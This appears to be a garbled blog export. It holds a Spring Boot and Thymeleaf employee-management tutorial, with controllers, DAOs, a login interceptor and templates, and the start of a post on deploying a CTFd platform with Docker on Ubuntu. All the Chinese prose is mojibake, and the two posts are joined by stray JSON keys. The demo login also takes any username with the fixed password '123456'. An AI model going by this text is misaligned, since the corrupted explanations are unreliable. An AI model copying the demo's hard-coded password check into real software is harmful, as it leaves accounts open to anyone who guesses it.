ç›®å½•ä¸‹æ‰€æœ‰é¡µé¢ï¼Œåªèƒ½é€šè¿‡ controller æ¥è·³è½¬ã€‚åˆ›å»ºä¸€ä¸ª test.html,æ§åˆ¶å™¨é‡Œçš„æ˜ å°„å¿…é¡»æ˜¯ test æ‰è¡Œ 12345678910111213141516package com.she11f.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;@Controllerpublic class ThymeleafDemo &#123; @RequestMapping(&quot;/test&quot;) public String test1(Model model)&#123; //å­˜å…¥æ•°æ® model.addAttribute(&quot;msg&quot;,&quot;Hello,Thymeleaf&quot;); //classpath:/templates/test.html return &quot;test&quot;; &#125;&#125; è®¿é—® http://127.0.0.1:8088/test æ§åˆ¶å™¨é¡µé¢ 1234567891011121314151617181920package com.she11f.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.Arrays;import java.util.Map;@Controllerpublic class ThymeleafDemo &#123; @RequestMapping(&quot;/test&quot;) public String test2(Map&lt;String,Object&gt; map)&#123; //å­˜å…¥æ•°æ® map.put(&quot;msg&quot;,&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;); map.put(&quot;users&quot;, Arrays.asList(&quot;zhangsan&quot;,&quot;lisi&quot;)); //classpath:/templates/test.html return &quot;test&quot;; &#125;&#125; html é¡µé¢è¯­æ³•å…¶å®å’Œ vue å·®ä¸å¤š 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;æµ‹è¯•&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;æµ‹è¯•é¡µé¢&lt;/h1&gt;&lt;div th:text=&quot;$&#123;msg&#125;&quot;&gt;&lt;/div&gt;&lt;!--ä¸è½¬ä¹‰--&gt;&lt;div th:utext=&quot;$&#123;msg&#125;&quot;&gt;&lt;/div&gt;&lt;!--éå†æ•°æ®--&gt;&lt;!--th:eachæ¯æ¬¡éå†éƒ½ä¼šç”Ÿæˆå½“å‰è¿™ä¸ªæ ‡ç­¾ï¼šå®˜ç½‘#9--&gt;&lt;h4 th:each=&quot;user :$&#123;users&#125;&quot; th:text=&quot;$&#123;user&#125;&quot;&gt;&lt;/h4&gt;&lt;h4&gt; &lt;!--è¡Œå†…å†™æ³•ï¼šå®˜ç½‘#12--&gt; &lt;span th:each=&quot;user:$&#123;users&#125;&quot;&gt;[[$&#123;user&#125;]]&amp;nbsp;&lt;/span&gt;&lt;/h4&gt;&lt;/body&gt;&lt;/html&gt; å‘˜å·¥ç®¡ç†ç³»ç»Ÿæ­å»ºç´ ææ¥è‡ªäº é“¾æ¥ï¼šhttps://pan.baidu.com/s/1ITFMd_myJBYI3zv1N9w_Aw æå–ç ï¼šz7x8 0x01 å‡†å¤‡å·¥ä½œå…ˆå¯¼å…¥å››ä¸ªé™æ€é¡µé¢å¯¼å…¥ templates æ–‡ä»¶å¤¹ä¸‹ï¼Œé™æ€èµ„æºæ”¾å…¥ static æ–‡ä»¶å¤¹ æš‚æ—¶æ‰‹åŠ¨æ¨¡æ‹Ÿæ•°æ®åº“ ç¼–å†™ pojo å±‚ å‘˜å·¥è¡¨ 1234567891011121314151617181920212223242526package com.she11f.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;import java.util.Date;//å‘˜å·¥è¡¨@Data@NoArgsConstructorpublic class Employee &#123; private Integer id; private String lastName; private String email; private Integer gender; //æ€§åˆ« 0 å¥³ï¼Œ 1ï¼Œç”· private Department department; private Date birth; public Employee(Integer id, String lastName, String email, Integer gender, Department department) &#123; this.id = id; this.lastName = lastName; this.email = email; this.gender = gender; this.department = department; this.birth = new Date(); &#125;&#125; éƒ¨é—¨è¡¨ 123456789101112package com.she11f.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;//éƒ¨é—¨è¡¨@Data@AllArgsConstructor@NoArgsConstructorpublic class Department &#123; private int id; //éƒ¨é—¨id private String departmentName; //éƒ¨é—¨åå­—&#125; æ·»åŠ lombokä¾èµ– 12345&lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; ç¼–å†™daoå±‚ éƒ¨é—¨ dao 12345678910111213141516171819202122232425262728293031323334353637package com.she11f.dao;import com.she11f.pojo.Department;import org.springframework.stereotype.Repository;import java.util.Collection;import java.util.HashMap;import java.util.Map;//éƒ¨é—¨dao@Repositorypublic class DepartmentDao &#123; //æ¨¡æ‹Ÿæ•°æ®åº“ä¸­çš„æ•°æ® private static Map&lt;Integer, Department&gt;departments = null; static &#123; departments = new HashMap&lt;Integer, Department&gt;(); //åˆ›å»ºä¸€ä¸ªéƒ¨é—¨è¡¨ departments.put(101,new Department(101,&quot;æ•™å­¦éƒ¨&quot;)); departments.put(102,new Department(102,&quot;å¸‚åœºéƒ¨&quot;)); departments.put(103,new Department(103,&quot;æ•™ç ”éƒ¨&quot;)); departments.put(104,new Department(104,&quot;è¿è¥éƒ¨&quot;)); departments.put(105,new Department(105,&quot;åå‹¤éƒ¨&quot;)); &#125; //è·å–æ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯ public Collection&lt;Department&gt; getDepartments()&#123; return departments.values(); &#125; //é€šè¿‡idå¾—åˆ°éƒ¨é—¨ public Department getDepartmentById(Integer id)&#123; return departments.get(id); &#125;&#125; å‘˜å·¥dao 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.she11f.dao;import com.she11f.pojo.Department;import com.she11f.pojo.Employee;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Repository;import java.util.Collection;import java.util.HashMap;import java.util.Map;//å‘˜å·¥dao@Repository //è¢«stringæ‰˜ç®¡public class EmployeeDao &#123; //æ¨¡æ‹Ÿæ•°æ®åº“ä¸­çš„æ•°æ® private static Map&lt;Integer, Employee&gt; employees= null; //å‘˜å·¥æ‰€å±çš„éƒ¨é—¨ @Autowired private DepartmentDao departmentDao; static &#123; employees = new HashMap&lt;Integer,Employee&gt;(); //åˆ›å»ºä¸€ä¸ªéƒ¨é—¨è¡¨ employees.put(1001,new Employee( 1001,&quot;AA&quot;,&quot;1622840727@qq.com&quot;,1,new Department(101,&quot;æ•™å­¦éƒ¨&quot;))); employees.put(1002,new Employee( 1002,&quot;BB&quot;,&quot;2622840727@qq.com&quot;,0,new Department(102,&quot;å¸‚åœºéƒ¨&quot;))); employees.put(1003,new Employee( 1003,&quot;CC&quot;,&quot;4622840727@qq.com&quot;,1,new Department(103,&quot;æ•™ç ”éƒ¨&quot;))); employees.put(1004,new Employee( 1004,&quot;DD&quot;,&quot;5628440727@qq.com&quot;,0,new Department(104,&quot;è¿è¥éƒ¨&quot;))); employees.put(1005,new Employee( 1005,&quot;FF&quot;,&quot;6022840727@qq.com&quot;,1,new Department(105,&quot;åå‹¤éƒ¨&quot;))); &#125; //ä¸»é”®è‡ªå¢ private static Integer ininId = 1006; //å¢åŠ ä¸€ä¸ªå‘˜å·¥ public void save(Employee employee)&#123; if(employee.getId() == null)&#123; employee.setId(ininId++); &#125; employee.setDepartment(departmentDao.getDepartmentById(employee.getDepartment().getId())); employees.put(employee.getId(),employee); &#125; //æŸ¥è¯¢å…¨éƒ¨çš„å‘˜å·¥ public Collection&lt;Employee&gt;getALL()&#123; return employees.values(); &#125; //é€šè¿‡idæŸ¥è¯¢å‘˜å·¥ public Employee getEmployeeById(Integer id)&#123; return employees.get(id); &#125; //åˆ é™¤ä¸€ä¸ªå‘˜é€šè¿‡id public void delete(Integer id)&#123; employees.remove(id); &#125;&#125; 0x02 é¦–é¡µå®ç°å¼•å…¥Thymeleaf 12345678&lt;dependency&gt; &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-spring5&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-extras-java8time&lt;/artifactId&gt;&lt;/dependency&gt; ç¼–å†™ MyMvcConfig 123456789101112131415package com.she11f.config;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;//æ‰©å±•ä½¿ç”¨SpringMVC@Configurationpublic class MyMvcConfig implements WebMvcConfigurer &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(&quot;/&quot;).setViewName(&quot;index&quot;); registry.addViewController(&quot;/index.html&quot;).setViewName(&quot;index&quot;); &#125;&#125; ç”¨ thymeleaf è¯­æ³•æ›´æ”¹é™æ€èµ„æºè·¯å¾„ æ‰€æœ‰çš„é™æ€èµ„æºè·¯å¾„éƒ½éœ€è¦ä½¿ç”¨thymeleafæ¥ç®¡ï¼š@{}ï¼Œth:href,th:src 12&lt;link href=&quot;asserts/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link th:href=&quot;@&#123;/css/bootstrap.min.css&#125;&quot; rel=&quot;stylesheet&quot;&gt; application.yml ä¿®æ”¹ 1234# å…³é—­æ¨¡æ¿å¼•æ“çš„ç¼“å­˜spring: thymeleaf: cache=false: å¯åŠ¨ç¨‹åºï¼Œæ‰“å¼€ localhost:8088,é¦–é¡µè®¾ç½®æˆåŠŸ 0x03 ç™»å½•+æ‹¦æˆªå™¨å…ˆç»™ç™»é™†é¡µé¢è¡¨å•æäº¤å†™ä¸€ä¸ª controller,ç™»å½•é¡µå…ˆæ¢æˆ thymeleaf è¯­æ³•ã€‚ 1&lt;form class=&quot;form-signin&quot; th:action=&quot;@&#123;/user/login&#125;&quot; method=&quot;post&quot;&gt; &#x2F;&#x2F; è¿™é‡Œé¢çš„æ‰€æœ‰ input æ ‡ç­¾éƒ½éœ€è¦åŠ ä¸Šä¸€ä¸ªnameå±æ€§ï¼Œä¸ç„¶æ‹¦æˆªå™¨å¾—ä¸åˆ°å‚æ•° ç¼–å†™ MyMvcConfig 1registry.addViewController(&quot;/main.html&quot;).setViewName(&quot;dashboard&quot;); ç¼–å†™ LoginController 123456789101112131415161718@Controllerpublic class LoginController &#123; @RequestMapping(&quot;/user/login&quot;) public String login( @RequestParam(&quot;username&quot;) String username , @RequestParam(&quot;password&quot;) String password, Model model)&#123; //å…·ä½“çš„ä¸šåŠ¡ if(!StringUtils.isEmpty(username)&amp;&amp;&quot;123456&quot;.equals(password))&#123; return &quot;redirect:/main.html&quot;; &#125; else&#123; //å‘Šè¯‰ç”¨æˆ·ï¼Œä½ ç™»å½•å¤±è´¥ model.addAttribute(&quot;msg&quot;,&quot;ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ï¼&quot;); return &quot;index&quot;; &#125; &#125;&#125; æµ‹è¯•æˆåŠŸç™»å½• ç™»å½•å¤±è´¥çš„è¯ï¼Œæˆ‘ä»¬éœ€è¦å°†åå°ä¿¡æ¯è¾“å‡ºåˆ°å‰å°ï¼Œå¯ä»¥åœ¨é¦–é¡µæ ‡é¢˜ä¸‹é¢åŠ ä¸Šåˆ¤æ–­ 123&lt;!--åˆ¤æ–­æ˜¯å¦æ˜¾ç¤ºï¼Œä½¿ç”¨if, $&#123;&#125;å¯ä»¥ä½¿ç”¨å·¥å…·ç±»ï¼Œå¯ä»¥çœ‹thymeleafçš„ä¸­æ–‡æ–‡æ¡£--&gt; &lt;p style=&quot;color: red&quot; th:text=&quot;$&#123;msg&#125;&quot; th:if=&quot;$&#123;not #strings.isEmpty(msg)&#125;&quot;&gt; &lt;/p&gt; æ¥ç€æ·»åŠ æ‹¦æˆªå™¨ï¼Œåœ¨ LoginController é¡µé¢æ·»åŠ  session 1session.setAttribute(&quot;loginUser&quot;,username); åœ¨ config ä¸‹è‡ªå®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨ LoginHandlerInterceptor 1234567891011121314151617181920212223package com.she11f.config;import org.springframework.web.servlet.HandlerInterceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;//è‡ªå®šä¹‰æ‹¦æˆªå™¨public class LoginHandlerInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; //è·å– loginUser ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ Object user = request.getSession().getAttribute(&quot;loginUser&quot;); if(user == null)&#123;//æœªç™»å½•ï¼Œè¿”å›ç™»å½•é¡µé¢ request.setAttribute(&quot;msg&quot;,&quot;æ²¡æœ‰æƒé™ï¼Œè¯·å…ˆç™»å½•&quot;); request.getRequestDispatcher(&quot;/index.html&quot;).forward(request,response); return false; &#125;else&#123; //ç™»å½•ï¼Œæ”¾è¡Œ return true; &#125; &#125;&#125; ç„¶åå°†æ‹¦æˆªå™¨æ³¨å†Œåˆ°æˆ‘ä»¬çš„ SpringMVC é…ç½®ç±»å½“ä¸­ï¼ 12345678@Override public void addInterceptors(InterceptorRegistry registry) &#123; // æ³¨å†Œæ‹¦æˆªå™¨ï¼ŒåŠæ‹¦æˆªè¯·æ±‚å’Œè¦å‰”é™¤å“ªäº›è¯·æ±‚! // æˆ‘ä»¬è¿˜éœ€è¦è¿‡æ»¤é™æ€èµ„æºæ–‡ä»¶ï¼Œå¦åˆ™æ ·å¼æ˜¾ç¤ºä¸å‡ºæ¥ registry.addInterceptor(new LoginHandlerInterceptor()) .addPathPatterns(&quot;/**&quot;) .excludePathPatterns(&quot;/index.html&quot;,&quot;/user/login&quot;,&quot;/&quot;,&quot;/css/*&quot;,&quot;/img/**&quot;,&quot;/js/**&quot;);&#125; æˆ‘ä»¬ç„¶ååœ¨åå°ä¸»é¡µï¼Œè·å–ç”¨æˆ·ç™»å½•çš„ä¿¡æ¯ 12&lt;!--åå°ä¸»é¡µæ˜¾ç¤ºç™»å½•ç”¨æˆ·çš„ä¿¡æ¯--&gt;[[$&#123;session.loginUser&#125;]] &lt;!--$å–ELè¡¨è¾¾å¼--&gt; 0x04 å‘˜å·¥åˆ—è¡¨å±•ç¤º å°†é¦–é¡µçš„ä¾§è¾¹æ Customersæ”¹ä¸ºå‘˜å·¥ç®¡ç†ã€ æ·»åŠ  a é“¾æ¥è·³è½¬ 1&lt;a class=&quot;nav-link&quot; th:href=&quot;@&#123;/emps&#125;&quot;&gt;å‘˜å·¥ç®¡ç†&lt;/a&gt; list ç§»åŠ¨è‡³ emp æ–‡ä»¶å¤¹ä¸‹ ç¼–å†™å¤„ç†è¯·æ±‚çš„controller 1234567891011121314151617181920212223242526package com.she11f.controller;import com.she11f.dao.EmployeeDao;import com.she11f.pojo.Employee;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.Collection;//å‘˜å·¥åˆ—è¡¨@Controllerpublic class EmployeeController &#123; @Autowired EmployeeDao employeeDao; @RequestMapping(&quot;/emps&quot;) public String list(Model model)&#123; Collection&lt;Employee&gt; employees = employeeDao.getALL(); model.addAttribute(&quot;emps&quot;,employees); return &quot;emp/list&quot;; &#125;&#125; æ‹¿ä¸€ä¸‹æ•°æ®é¡ºä¾¿ç¾åŒ–ä¸€ä¸‹é¡µé¢ 123456789101112131415161718192021222324&lt;thead&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;lastName&lt;/th&gt; &lt;th&gt;email&lt;/th&gt; &lt;th&gt;gender&lt;/th&gt; &lt;th&gt;department&lt;/th&gt; &lt;th&gt;birth&lt;/th&gt; &lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt; &lt;tr th:each=&quot;emp:$&#123;emps&#125;&quot;&gt; &lt;td th:text=&quot;$&#123;emp.getId()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.getLastName()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.getEmail()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.getGender()==0?&#x27;å¥³&#x27;:&#x27;ç”·&#x27;&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.department.getDepartmentName()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;#dates.format(emp.getBirth(),&#x27;yyyy-MM-dd HH:mm:ss&#x27;)&#125;&quot;&gt;&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;btn btn-sm btn-primary&quot;&gt;ç¼–è¾‘&lt;/button&gt; &lt;button class=&quot;btn btn-sm btn-danger&quot;&gt;åˆ é™¤&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; 0x05 æ·»åŠ å‘˜å·¥å…ˆä¿®æ”¹è·³è½¬é“¾æ¥ 1&lt;h2&gt;&lt;a class=&quot;btn btn-sm btn-success&quot; th:href=&quot;@&#123;/emp&#125;&quot;&gt;æ·»åŠ å‘˜å·¥&lt;/a&gt;&lt;/h2&gt; åœ¨å‘˜å·¥æ§åˆ¶å™¨é‡ŒåŠ ä¸€æ¡è§„åˆ™ 1234@RequestMapping(&quot;/emp&quot;) public String toAddPage()&#123; return &quot;emp/add&quot;; &#125; ç¼–å†™ add.html,å¤åˆ¶ list.html ç„¶åæŠŠè¡¨å•éƒ¨åˆ†æ¢è¿›æ¥ 12345678910111213141516171819202122232425262728&lt;form th:action=&quot;@&#123;/emp&#125;&quot; method=&quot;post&quot; &gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;LastName&lt;/label&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;she11F&quot; type=&quot;text&quot; name=&quot;lastName&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;Email&lt;/label&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;2097688176@qq.com&quot; type=&quot;email&quot; name=&quot;email&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;1&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;ç”·&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;0&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;å¥³&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;department&lt;/label&gt; &lt;select class=&quot;form-control&quot; name=&quot;department.id&quot;&gt; &lt;option th:each=&quot;dept:$&#123;departments&#125;&quot; th:text=&quot;$&#123;dept.getDepartmentName()&#125;&quot; th:value=&quot;$&#123;dept.getId()&#125;&quot;&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt; &lt;label &gt;Birth&lt;/label&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;2024/7/10&quot; type=&quot;text&quot; name=&quot;birth&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot; type=&quot;submit&quot;&gt;æ·»åŠ &lt;/button&gt; &lt;/form&gt; ç¼–å†™ä¸€ä¸ª&#x2F;emp post æ§åˆ¶å™¨æ¥å®ç°è¡¨å•æäº¤ 12345678910//å‘˜å·¥æ·»åŠ åŠŸèƒ½//æ¥æ”¶å‰ç«¯ä¼ é€’çš„å‚æ•°ï¼Œè‡ªåŠ¨å°è£…æˆä¸ºå¯¹è±¡[è¦æ±‚å‰ç«¯ä¼ é€’çš„å‚æ•°åï¼Œå’Œå±æ€§åä¸€è‡´] @PostMapping(&quot;/emp&quot;) public String addEmp(Employee employee)&#123; //ä¿å­˜å‘˜å·¥çš„ä¿¡æ¯ System.out.println(employee); employeeDao.save(employee); // å›åˆ°å‘˜å·¥åˆ—è¡¨é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨redirectæˆ–è€…forwardï¼Œå°±ä¸ä¼šè¢«è§†å›¾è§£æå™¨è§£æ return &quot;redirect:/emps&quot;; &#125; æ·»åŠ æˆåŠŸ 0x06 ä¿®æ”¹å‘˜å·¥ä¿¡æ¯ä¿®æ”¹è·³è½¬é“¾æ¥çš„ä½ç½® 1&lt;a class=&quot;btn btn-sm btn-primary&quot; th:href=&quot;@&#123;/emp/&#125;+$&#123;emp.getId()&#125;&quot;&gt;ç¼–è¾‘&lt;/a&gt; ç¼–å†™è·³è½¬æ§åˆ¶å™¨ 1234567891011//å‘˜å·¥ä¿®æ”¹é¡µé¢@GetMapping(&quot;/emp/&#123;id&#125;&quot;)public String toUpdateEmp(@PathVariable(&quot;id&quot;) Integer id,Model model)&#123; Employee employee = employeeDao.getEmployeeById(id); model.addAttribute(&quot;emp&quot;,employee); //æŸ¥è¯¢æ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯ Collection&lt;Department&gt; departments = departmentDao.getDepartments(); model.addAttribute(&quot;departments&quot;,departments); return &quot;emp/update&quot;;&#125; ç¼–å†™ update é¡µé¢ï¼Œå¤åˆ¶ add é¡µé¢ï¼Œä¿®æ”¹å…¶è¡¨å• 1234567891011121314151617181920212223242526272829&lt;form th:action=&quot;@&#123;/emp&#125;&quot; method=&quot;post&quot; &gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; th:value=&quot;$&#123;emp.getId()&#125;&quot;&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;LastName&lt;/label&gt; &lt;input th:value=&quot;$&#123;emp.getLastName()&#125;&quot; class=&quot;form-control&quot; placeholder=&quot;kuangshen&quot; type=&quot;text&quot; name=&quot;lastName&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;Email&lt;/label&gt; &lt;input th:value=&quot;$&#123;emp.getEmail()&#125;&quot; class=&quot;form-control&quot; placeholder=&quot;24736743@qq.com&quot; type=&quot;email&quot; name=&quot;email&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input th:checked=&quot;$&#123;emp.getGender()==1&#125;&quot; class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;1&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;ç”·&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input th:checked=&quot;$&#123;emp.getGender()==0&#125;&quot; class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;0&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;å¥³&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;department&lt;/label&gt; &lt;select class=&quot;form-control&quot; name=&quot;department.id&quot;&gt; &lt;option th:selected=&quot;$&#123;dept.id==emp.getDepartment().getId()&#125;&quot; th:each=&quot;dept:$&#123;departments&#125;&quot; th:text=&quot;$&#123;dept.getDepartmentName()&#125;&quot; th:value=&quot;$&#123;dept.getId()&#125;&quot;&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt; &lt;label &gt;Birth&lt;/label&gt; &lt;input th:value=&quot;$&#123;#dates.format(emp.birth,&#x27;yyyy-MM-dd HH:mm&#x27;)&#125;&quot; class=&quot;form-control&quot; placeholder=&quot;2021-02-02&quot; type=&quot;text&quot; name=&quot;birth&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot; type=&quot;submit&quot;&gt;ä¿®æ”¹&lt;/button&gt;&lt;/form&gt; ä¿®æ”¹æˆåŠŸ 0x07 åˆ é™¤å‘˜å·¥ä»¥åŠ404é¡µé¢å®ç°ç¼–å†™è·³è½¬ 1&lt;a class=&quot;btn btn-sm btn-danger&quot; th:href=&quot;@&#123;/delemp/&#125;+$&#123;emp.getId()&#125;&quot;&gt;åˆ é™¤&lt;/a&gt; ç¼–å†™æ§åˆ¶å™¨ 123456//å‘˜å·¥åˆ é™¤ @GetMapping(&quot;/delemp/&#123;id&#125;&quot;) public String deleteEmp(@PathVariable(&quot;id&quot;) Integer id)&#123; employeeDao.delete(id); return &quot;redirect:/emps&quot;; &#125; æµ‹è¯•ï¼ŒæˆåŠŸåˆ é™¤å‘˜å·¥ã€‚ æ–°å»º error æ–‡ä»¶å¤¹ï¼ŒæŠŠ 404.html ç§»è¿›å»å³å¯ï¼Œè®¿é—®ä¸å­˜åœ¨çš„è·¯ç”±ï¼Œè¿”å›æˆ‘ä»¬çš„ 4040 é¡µé¢","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"path":"/2024/07/04/ctf/åŸºäº ctfd æ­å»ºæ¯”èµ›å¹³å°/","content":"è…¾è®¯äº‘ Ubuntu 22.04 ç¯å¢ƒé…ç½®æ¢æº å¤‡ä»½é•œåƒæºè®¾ç½®æ–‡ä»¶ 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak ç¼–è¾‘é•œåƒæºè®¾ç½®æ–‡ä»¶ 1vim /etc/apt/sources.list æ›¿æ¢æ‰åŸæ–‡ä»¶ä¸­çš„æ‰€æœ‰å†…å®¹å¹¶æ›¿æ¢ 12345678910111213# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Šdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse# é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse ç„¶å 12sudo apt updatesudo apt upgrade æ›´æ¢ pip æº 123cd ~ # è¿›å…¥å®¶ç›®å½• cd .pip # è¿›å…¥.pipæ–‡ä»¶å¤¹vim pip.conf # ç”¨vimç¼–è¾‘pip.confæ–‡ä»¶ ç¼–è¾‘å†…å®¹ä¸º 1234567891011[global] index-url=https://pypi.tuna.tsinghua.edu.cn/simple timeout = 6000 [install] trusted-host=pypi.tuna.tsinghua.edu.cn disable-pip-version-check = true docker ï¼Œ Docker Composeå®‰è£…1234567apt-get install git docker docker-compose -yæˆ–è€…#apt-get install git docker.io docker-compose -y#å¯åŠ¨ dockerï¼Œå¹¶è®¾ç½®ä¸ºå¼€æœºè‡ªå¯sudo systemctl start dockersudo systemctl enable docker 123éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸdocker --versiondocker-compose --version å¯ç”¨Docker Swarmï¼Œå¹¶ä¸ºç”Ÿæˆçš„ManagerèŠ‚ç‚¹å–ä¸€ä¸ªåˆ«å 12docker swarm init --advertise-addr 127.0.0.1docker node update --label-add=&#x27;name=linux-1&#x27; $(docker node ls -q) ctfd å®‰è£…123456789git clone https://github.com/huangzheng2016/CTFd-docker CTFdè¿™ä¸€æ­¥è·³è¿‡ä¿®æ”¹vi CTFd/docker-compose.ymlæ”¹è¿™ä¸‰è¡Œ - CTFD_URL=ä½ çš„ip/domain - DIRECT_URL=ä½ çš„ip/domain - DYNAMIC_URL=ä½ çš„ip/domain ä¸æ”¹å›é»˜è®¤è·³è½¬åˆ°test.comï¼Œå¦‚æœæ˜¯è¿™æ ·åªèƒ½é‡æ–°æ­å»ºäº† #docker æ¢æº 1sudo vim /etc/docker/daemon.json æ›¿æ¢ä¸º 123&#123; &quot;registry-mirrors&quot;:[&quot;https://docker.1panel.live&quot;]&#125; æˆ–è€…å»é˜¿é‡ŒåŠ é€Ÿhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors 123#é‡å¯systemctl daemon-reloadsystemctl restart docker å¯åŠ¨å®¹å™¨ 123docker-compose builddocker-compose up -ddocker-compose -f docker-compose.yml exec ctfd python manage.py set_config whale auto_connect_network éƒ¨ç½²èµ›é¢˜ç°æˆçš„é¢˜åº“12345sudo mkdir -p /opt/CTF #åˆ›å»ºCTFç›®å½•cd /opt/CTFgit clone https://githubfast.com/CTFTraining/suctf_2019_easysql #åœ¨ CTFTraining æ‹‰å–ä¸€é“çœŸé¢˜ cd suctf_2019_easysqlls ç„¶åæˆ‘ä»¬ç›´æ¥åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼š 1sudo docker-compose up -d 